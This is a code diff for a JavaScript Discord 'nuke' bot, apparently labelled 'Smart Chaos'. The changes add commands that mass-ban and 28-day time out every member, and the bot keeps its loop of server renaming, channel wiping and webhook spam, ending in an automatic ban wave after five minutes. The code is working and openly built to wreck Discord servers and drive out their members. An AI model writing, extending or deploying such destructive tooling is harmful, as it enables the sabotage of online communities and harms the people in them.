@@ -26,15 +26,15 @@ const FINAL_TIMEOUT = 28 * 24 * 60 * 60 * 1000; // 28 days
 const NUKE_DURATION = 5 * 60 * 1000;
 
 let nukeActive = false;
-let currentMode = 'normal'; // 'normal' | 'very'
+let currentMode = 'normal';
 let ticking = false;
 let nukeTimeout = null;
 
-// ================== SMART CACHES ==================
+// ================== CACHES ==================
 const cache = {
-  members: new Map(),      // guildId -> { data, expires }
-  webhooks: new Map(),     // channelId_name -> webhook
-  lastActions: new Map(),  // avoid repeating same heavy action too fast
+  members: new Map(),
+  webhooks: new Map(),
+  lastActions: new Map(),
 };
 
 function getCachedMembers(guildId) {
@@ -47,10 +47,12 @@ function setCachedMembers(guildId, data, ttl = 15000) {
   cache.members.set(guildId, { data, expires: Date.now() + ttl });
 }
 
-async function smartMembers(guild) {
-  let members = getCachedMembers(guild.id);
-  if (members) return members;
-  members = await guild.members.fetch().catch(() => null);
+async function smartMembers(guild, force = false) {
+  if (!force) {
+    const cached = getCachedMembers(guild.id);
+    if (cached) return cached;
+  }
+  const members = await guild.members.fetch().catch(() => null);
   if (members) setCachedMembers(guild.id, members);
   return members;
 }
@@ -62,9 +64,7 @@ async function smartWebhook(channel, name = 'Minion') {
   try {
     const hooks = await channel.fetchWebhooks();
     let wh = hooks.find(h => h.name === name);
-    if (!wh) {
-      wh = await channel.createWebhook({ name, reason: 'Smart Chaos' });
-    }
+    if (!wh) wh = await channel.createWebhook({ name, reason: 'Smart Chaos' });
     cache.webhooks.set(key, wh);
     return wh;
   } catch {
@@ -146,7 +146,6 @@ async function safeDelete(channel) {
   return channel.delete('Smart Chaos').catch(() => {});
 }
 
-// ================== SMART STATE SNAPSHOT ==================
 function snapshot(guild) {
   const textChannels = guild.channels.cache.filter(
     c => c.type === ChannelType.GuildText && c.manageable
@@ -168,10 +167,71 @@ function snapshot(guild) {
   };
 }
 
-// ================== FINAL BAN WAVE ==================
+// ================== LIVE COMMANDS: !ban / !mute ==================
+async function massBan(guild, message) {
+  if (message) await message.reply('🔪 **Mass ban started...**');
+
+  const members = await smartMembers(guild, true); // force fresh
+  if (!members) {
+    if (message) await message.reply('❌ Could not fetch members.');
+    return;
+  }
+
+  let banned = 0, failed = 0;
+
+  await Promise.allSettled(
+    [...members.values()].map(async (m) => {
+      if (m.user.bot || m.id === guild.ownerId) return;
+      try {
+        if (m.bannable) {
+          await m.ban({ reason: 'Manual !ban' });
+          banned++;
+        } else failed++;
+      } catch {
+        failed++;
+      }
+    })
+  );
+
+  const text = `✅ Mass ban done → **Banned: ${banned}** | Failed: ${failed}`;
+  console.log(text);
+  if (message) await message.reply(text).catch(() => {});
+}
+
+async function massMute(guild, message) {
+  if (message) await message.reply('🔇 **Mass mute started...**');
+
+  const members = await smartMembers(guild, true);
+  if (!members) {
+    if (message) await message.reply('❌ Could not fetch members.');
+    return;
+  }
+
+  let muted = 0, failed = 0;
+
+  await Promise.allSettled(
+    [...members.values()].map(async (m) => {
+      if (m.user.bot || m.id === guild.ownerId) return;
+      try {
+        if (m.moderatable) {
+          await m.timeout(FINAL_TIMEOUT, 'Manual !mute');
+          muted++;
+        } else failed++;
+      } catch {
+        failed++;
+      }
+    })
+  );
+
+  const text = `✅ Mass mute done → **Muted: ${muted}** | Failed: ${failed}`;
+  console.log(text);
+  if (message) await message.reply(text).catch(() => {});
+}
+
+// ================== FINAL BAN WAVE (auto after 5 min) ==================
 async function finalBanWave(guild) {
-  console.log('🔪 FINAL BAN WAVE...');
-  const members = await smartMembers(guild);
+  console.log('🔪 AUTO FINAL BAN WAVE...');
+  const members = await smartMembers(guild, true);
   if (!members) return;
 
   let banned = 0, timedOut = 0, failed = 0;
@@ -200,11 +260,10 @@ async function finalBanWave(guild) {
     })
   );
 
-  console.log(`✅ Ban wave → Banned: ${banned} | Timed out: ${timedOut} | Failed: ${failed}`);
+  console.log(`✅ Auto wave → Banned: ${banned} | Timed out: ${timedOut} | Failed: ${failed}`);
 }
 
 // ================== SMART ACTIONS ==================
-// Each action returns true if it did useful work
 const actions = {
   async renameServer(guild) {
     if (!canRun('rename', 8000)) return false;
@@ -374,7 +433,6 @@ const actions = {
     return true;
   },
 
-  // ===== ARMY =====
   async armyGif(guild, state) {
     if (state.webhookCount < 1) return false;
     if (!canRun('armyGif', 4000)) return false;
@@ -480,7 +538,6 @@ const actions = {
   },
 };
 
-// Weighted action pools (smarter selection)
 const BOSS_POOL = [
   { fn: actions.renameServer, weight: 2 },
   { fn: actions.wipeChannels, weight: 4 },
@@ -538,7 +595,6 @@ async function runSmartTick(guild) {
   const bossFns = pickWeighted(BOSS_POOL, bossCount);
   const armyFns = pickWeighted(ARMY_POOL, armyCount);
 
-  // Run only useful work, fully parallel
   await Promise.allSettled([
     ...bossFns.map(fn => fn(guild, state)),
     ...armyFns.map(fn => fn(guild, state)),
@@ -550,20 +606,16 @@ async function runSmartTick(guild) {
   ticking = false;
 }
 
-// ================== NON-OVERLAPPING LOOP ==================
 async function nukeLoop(guild) {
   const base = currentMode === 'very' ? 1600 : 3200;
-
   while (nukeActive) {
     const t0 = Date.now();
     await runSmartTick(guild);
     const elapsed = Date.now() - t0;
-    const delay = Math.max(base - elapsed, 150);
-    await sleep(delay);
+    await sleep(Math.max(base - elapsed, 150));
   }
 }
 
-// ================== START / STOP ==================
 async function startNuke(guild, message, mode = 'normal') {
   if (nukeActive) {
     if (message) await message.reply('⚠️ Already running.');
@@ -577,8 +629,8 @@ async function startNuke(guild, message, mode = 'normal') {
   if (message) {
     await message.reply(
       mode === 'very'
-        ? '💣 **VERY AGGRESSIVE SMART MODE**\nFaster + heavier + state-aware.'
-        : '💣 **SMART CHAOS MODE**\nEfficient + state-aware.'
+        ? '💣 **VERY AGGRESSIVE SMART MODE**\nYou can still use `!ban` / `!mute` anytime.'
+        : '💣 **SMART CHAOS MODE**\nYou can still use `!ban` / `!mute` anytime.'
     );
   }
 
@@ -587,7 +639,7 @@ async function startNuke(guild, message, mode = 'normal') {
 
   nukeTimeout = setTimeout(async () => {
     nukeActive = false;
-    console.log('⏰ 5 MIN OVER → FINAL BAN WAVE');
+    console.log('⏰ 5 MIN OVER → AUTO BAN WAVE');
     await finalBanWave(guild);
     console.log('🛑 SMART NUKE ENDED');
   }, NUKE_DURATION);
@@ -597,24 +649,43 @@ async function startNuke(guild, message, mode = 'normal') {
 client.once('ready', () => {
   console.log(`✅ Logged in as ${client.user.tag}`);
   console.log('🧠 SMART CHAOS BOT READY');
-  console.log('→ !nuke  = Smart normal');
-  console.log('→ !NUKE  = Smart VERY aggressive');
+  console.log('→ !nuke / !NUKE  = start chaos');
+  console.log('→ !ban           = mass ban (works during nuke)');
+  console.log('→ !mute          = mass mute 28d (works during nuke)');
+  console.log('→ !nuke-stop     = stop chaos');
 });
 
 client.on('messageCreate', async (message) => {
   if (message.author.bot || !message.guild) return;
   if (!message.member?.permissions?.has(PermissionFlagsBits.Administrator)) return;
 
-  if (message.content === '!NUKE') {
+  const content = message.content.trim();
+
+  // Nuke modes
+  if (content === '!NUKE') {
     await startNuke(message.guild, message, 'very');
-  } else if (message.content === '!nuke') {
+    return;
+  }
+  if (content === '!nuke') {
     await startNuke(message.guild, message, 'normal');
+    return;
   }
 
-  if (message.content === '!nuke-stop' || message.content === '!NUKE-STOP') {
+  // Live mass actions (work anytime, including during nuke)
+  if (content === '!ban') {
+    await massBan(message.guild, message);
+    return;
+  }
+  if (content === '!mute') {
+    await massMute(message.guild, message);
+    return;
+  }
+
+  // Stop
+  if (content === '!nuke-stop' || content === '!NUKE-STOP') {
     nukeActive = false;
     if (nukeTimeout) clearTimeout(nukeTimeout);
-    await message.reply('🛑 Stopped.');
+    await message.reply('🛑 Nuke stopped.');
   }
 });
 
